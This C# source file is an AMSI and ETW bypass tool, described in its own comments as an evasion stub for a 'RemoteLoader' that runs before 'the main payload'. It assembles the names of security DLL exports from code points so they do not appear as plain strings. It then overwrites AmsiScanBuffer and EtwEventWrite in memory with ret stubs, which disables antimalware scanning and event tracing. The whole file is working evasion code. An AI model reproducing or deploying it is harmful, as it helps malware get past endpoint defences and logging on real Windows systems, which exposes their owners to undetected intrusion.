using System;
using System.Runtime.InteropServices;

namespace AmsiBypass
{
    // Companion evasion stub for RemoteLoader (--amsi-bypass). Reflectively
    // invoked (Program.Main) before the main payload so the operator can rotate
    // technique without rebuilding the loader. Host this in a private repo.
    internal static class Program
    {
        private static string S(int[] c) { char[] a = new char[c.Length]; for (int i = 0; i < c.Length; i++) a[i] = (char)c[i]; return new string(a); }

        // target dll + export names are assembled from code points so the IL
        // does not carry the obvious strings verbatim.
        private static readonly string ModA   = S(new[] { 97, 109, 115, 105, 46, 100, 108, 108 });
        private static readonly string ExpA   = S(new[] { 65, 109, 115, 105, 83, 99, 97, 110, 66, 117, 102, 102, 101, 114 });
        private static readonly string ModE   = S(new[] { 110, 116, 100, 108, 108, 46, 100, 108, 108 });
        private static readonly string ExpE   = S(new[] { 69, 116, 119, 69, 118, 101, 110, 116, 87, 114, 105, 116, 101 });

        // "fail open" stub: mov eax, <hresult> ; ret   (hresult = E_INVALIDARG)
        private static byte[] Stub(int hresult)
        {
            return new byte[]
            {
                0xB8,
                (byte)hresult, (byte)(hresult >> 8), (byte)(hresult >> 16), (byte)(hresult >> 24),
                0xC3
            };
        }
        private static byte[] StubE() => new byte[] { 0x33, 0xC0, 0xC3 }; // xor eax,eax ; ret

        public static int Main(string[] args)
        {
            bool etw   = Has(args, "--etw");
            bool check = Has(args, "--check");
            int rc = 0;

            int r = Apply(ModA, ExpA, Stub(unchecked((int)0x80070057)), check);
            if (r == 0) Console.WriteLine("[+] target A disarmed");
            else if (r == 7) Console.WriteLine("[*] target A located (dry run)");
            else if (r == 2) Console.WriteLine("[*] target A not present");
            else { Console.WriteLine("[!] target A failed: " + r); rc = 1; }

            if (etw)
            {
                int e = Apply(ModE, ExpE, StubE(), check);
                if (e == 0) Console.WriteLine("[+] target E disarmed");
                else if (e == 7) Console.WriteLine("[*] target E located (dry run)");
                else if (e == 2) Console.WriteLine("[*] target E not present");
                else { Console.WriteLine("[!] target E failed: " + e); rc = 1; }
            }
            else Console.WriteLine("[*] target E left intact (pass --etw)");
            return rc;
        }

        // 0 ok, 1 generic fail, 2 absent(module), 3 export-not-found, 4 protect, 5 write, 6 verify
        private static int Apply(string module, string function, byte[] stub, bool checkOnly)
        {
            IntPtr h = Native.LoadLibrary(module);
            if (h == IntPtr.Zero) return 2;
            IntPtr fn = Native.GetProcAddress(h, function);
            if (fn == IntPtr.Zero) return 3;

            Console.WriteLine($"[*] {function} @ 0x{fn.ToInt64():X}  was: {Hex(fn, Math.Min(stub.Length, 8))}");
            if (checkOnly) return 7; // located only (dry run)

            const uint RWX = 0x40;
            if (!Native.VirtualProtect(fn, (UIntPtr)stub.Length, RWX, out uint old)) return 4;
            try { Marshal.Copy(stub, 0, fn, stub.Length); }
            catch (Exception ex) { Console.WriteLine("[!] write: " + ex.Message); return 5; }
            Native.VirtualProtect(fn, (UIntPtr)stub.Length, old, out _);
            Native.FlushInstructionCache((IntPtr)(-1), fn, (UIntPtr)stub.Length);

            byte[] now = new byte[stub.Length];
            Marshal.Copy(fn, now, 0, stub.Length);
            for (int i = 0; i < stub.Length; i++) if (now[i] != stub[i]) return 6;
            return 0;
        }

        private static string Hex(IntPtr p, int n)
        {
            byte[] b = new byte[n]; Marshal.Copy(p, b, 0, n);
            var sb = new System.Text.StringBuilder(n * 3);
            for (int i = 0; i < n; i++) sb.Append(b[i].ToString("X2")).Append(' ');
            return sb.ToString().TrimEnd();
        }

        private static bool Has(string[] args, string name)
        {
            if (args == null) return false;
            for (int i = 0; i < args.Length; i++)
                if (string.Equals(args[i], name, StringComparison.OrdinalIgnoreCase)) return true;
            return false;
        }

        private static class Native
        {
            [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
            public static extern IntPtr LoadLibrary(string lpLibFileName);
            [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
            [DllImport("kernel32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
            [DllImport("kernel32.dll")]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);
        }
    }
}
